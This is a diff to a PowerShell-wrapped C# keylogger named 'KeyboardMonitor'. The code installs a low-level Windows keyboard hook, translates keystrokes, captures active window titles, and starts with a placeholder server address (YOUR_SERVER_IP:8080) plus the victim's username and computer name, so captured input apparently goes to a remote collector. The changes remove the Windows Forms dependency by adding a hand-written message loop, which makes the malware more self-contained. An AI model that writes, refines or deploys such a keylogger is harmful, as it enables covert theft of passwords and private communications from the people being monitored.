@@ -100,7 +100,6 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Timers;
-using System.Windows.Forms;
 
 public class KeyboardMonitor {
     private const int WH_KEYBOARD_LL = 13;
@@ -115,11 +114,17 @@ public class KeyboardMonitor {
     [DllImport("user32.dll")] private static extern int    GetWindowText(IntPtr hWnd, StringBuilder s, int n);
     [DllImport("user32.dll")] private static extern bool   GetKeyboardState(byte[] ks);
     [DllImport("user32.dll")] private static extern int    ToUnicode(uint vk, uint sc, byte[] ks, StringBuilder sb, int size, uint flags);
+    [DllImport("user32.dll")] private static extern int    GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
+    [DllImport("user32.dll")] private static extern bool   TranslateMessage(ref MSG msg);
+    [DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG msg);
 
     private delegate IntPtr LowLevelKeyboardProc(int code, IntPtr wParam, IntPtr lParam);
 
     [StructLayout(LayoutKind.Sequential)]
     private struct KBDLLHOOKSTRUCT { public uint vkCode, scanCode, flags, time; public IntPtr dwExtraInfo; }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct MSG { public IntPtr hWnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX, ptY; }
 
     private static IntPtr hookId = IntPtr.Zero;
     private static LowLevelKeyboardProc proc;
@@ -138,7 +143,12 @@ public class KeyboardMonitor {
 
         proc   = HookCallback;
         hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
-        Application.Run();
+
+        MSG msg;
+        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
+            TranslateMessage(ref msg);
+            DispatchMessage(ref msg);
+        }
     }
 
     private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
@@ -153,7 +163,7 @@ public class KeyboardMonitor {
         switch (vk) {
             case 8:  return "[BACK]";
             case 9:  return "[TAB]";
-            case 13: return "[ENTER]\n";
+            case 13: return "[ENTER]";
             case 27: return "[ESC]";
             case 32: return " ";
             case 37: return "[LEFT]";
@@ -168,12 +178,10 @@ public class KeyboardMonitor {
         int result = ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
         if (result >= 1) return sb.ToString(0, result);
         if (result == -1) {
-            // Dead key — call again to restore keyboard state, then discard
             ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
             return "";
         }
-        string name = ((Keys)vk).ToString();
-        return name.Length > 1 ? "[" + name + "]" : name;
+        return "";
     }
 
     private static string ActiveWindow() {
@@ -208,7 +216,7 @@ public class KeyboardMonitor {
         } catch {}
     }
 }
-"@ -ReferencedAssemblies "System.Windows.Forms"
+"@
 
 [KeyboardMonitor]::Start("http://YOUR_SERVER_IP:8080/", $env:USERNAME, $env:COMPUTERNAME)
 '@
